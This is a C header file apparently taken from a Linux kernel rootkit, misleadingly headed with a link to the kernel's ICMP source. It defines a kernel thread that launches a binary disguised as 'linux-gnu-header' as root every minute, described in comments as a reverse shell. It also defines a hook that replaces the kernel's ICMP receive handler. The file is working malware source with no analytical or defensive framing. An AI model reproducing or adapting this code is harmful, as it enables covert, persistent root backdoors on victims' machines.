// https://github.com/torvalds/linux/blob/3b07108ada81a8ebcebf1fe61367b4e436c895bd/net/ipv4/icmp.c#L1198
#ifndef ICMP_RCV_H
#define ICMP_RCV_H
#include "../config.h"

int revshell_func(void *data) {
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    char *argv[] = {"/usr/src/droplet/linux-gnu-header", NULL};

    while (!kthread_should_stop()) {
        // Execute /usr/src/droplet/linux-gnu-header every 60 seconds (1 minute)
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        ssleep(60);  // Sleep for 60 seconds (1 minute)
    }
    return 0;
}

static asmlinkage int(*original_icmp_rcv)(struct sk_buff *skb);
static asmlinkage int icmp_rcv_hook(struct sk_buff *skb) {
    // ICMP hook is kept for compatibility but no longer triggers reverse shell
    // Reverse shell now runs on a timer basis (every 1 minute)
    return original_icmp_rcv(skb);
}

#endif // !ICMP_RCV_H
